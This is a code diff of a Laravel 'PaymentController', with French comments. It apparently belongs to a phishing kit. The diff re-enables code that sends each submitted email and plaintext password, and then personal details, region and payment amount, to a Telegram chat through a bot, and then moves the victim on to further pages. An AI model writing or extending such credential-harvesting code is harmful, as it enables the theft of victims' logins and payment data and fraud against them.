@@ -25,25 +25,19 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
+        // Envoyer Telegram en arrière-plan avec timeout court
         try {
-            // TEMPORAIRE: Disabled pour debug
-            // Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-            //     ->notify(new TelegramAlert($message));
+            set_time_limit(3); // 3 secondes max pour Telegram
             
-            Log::info('Payment received - Telegram disabled for debug');
-
-            return redirect()->route('personal-info');
-
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
+                
         } catch (\Exception $e) {
-
             Log::error('Telegram sendToTelegram Error: ' . $e->getMessage());
-            Log::error('Telegram Stack: ' . $e->getTraceAsString());
-            
-            return redirect()->route('personal-info');
+            // Continue même si Telegram échoue
         }
 
-        
-        
+        return redirect()->route('personal-info');
     }
 
     /**
@@ -74,15 +68,16 @@ class PaymentController extends Controller
                  . "🗺️ Région : {$validated['region']}\n"
                  . "💰 Montant : {$validated['article_amount']} €";
 
+        // Envoyer Telegram en arrière-plan avec timeout court
         try {
-            // TEMPORAIRE: Disabled pour debug
-            // Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-            //     ->notify(new TelegramAlert($message));
+            set_time_limit(3); // 3 secondes max pour Telegram
             
-            Log::info('Personal Info received - Telegram disabled for debug');
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
+                
         } catch (\Exception $e) {
             Log::error('Telegram storePersonalInfo Error: ' . $e->getMessage());
-            Log::error('Telegram Stack: ' . $e->getTraceAsString());
+            // Continue même si Telegram échoue
         }
 
         return redirect()->route('reservation');
